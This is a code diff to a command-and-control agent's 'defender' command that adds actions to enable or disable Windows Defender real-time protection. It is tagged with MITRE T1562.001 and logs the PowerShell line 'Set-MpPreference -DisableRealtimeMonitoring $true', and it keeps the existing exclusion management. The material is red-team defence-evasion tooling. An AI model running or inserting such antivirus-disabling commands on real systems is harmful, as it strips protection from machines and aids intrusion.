@@ -10,8 +10,8 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "defender",
-		Description:         "Query Windows Defender status, manage exclusions, and view threat detections. Uses WMI (MSFT_MpComputerStatus) and registry APIs.",
-		HelpString:          "defender -action <status|exclusions|add-exclusion|remove-exclusion|threats> [-type <path|process|extension>] [-value <exclusion_value>]",
+		Description:         "Manage Windows Defender — status, exclusions, threats, enable/disable real-time protection. Uses WMI and PowerShell.",
+		HelpString:          "defender -action <status|exclusions|add-exclusion|remove-exclusion|threats|enable|disable> [-type <path|process|extension>] [-value <exclusion_value>]",
 		Version:             1,
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1562.001"}, // Impair Defenses: Disable or Modify Tools
@@ -24,9 +24,9 @@ func init() {
 				Name:          "action",
 				CLIName:       "action",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"status", "exclusions", "add-exclusion", "remove-exclusion", "threats"},
+				Choices:       []string{"status", "exclusions", "add-exclusion", "remove-exclusion", "threats", "enable", "disable"},
 				DefaultValue:  "status",
-				Description:   "Action: check status, list/add/remove exclusions, or view threat history",
+				Description:   "Action: check status, list/add/remove exclusions, view threats, or enable/disable real-time protection",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: true,
@@ -97,6 +97,10 @@ func init() {
 					BaseArtifactType: "Registry Write",
 					ArtifactMessage:  fmt.Sprintf("Defender %s exclusion removed: %s", exType, value),
 				})
+			case "enable":
+				createArtifact(taskData.Task.ID, "Process Create", "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false")
+			case "disable":
+				createArtifact(taskData.Task.ID, "Process Create", "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
 			}
 			return response
 		},
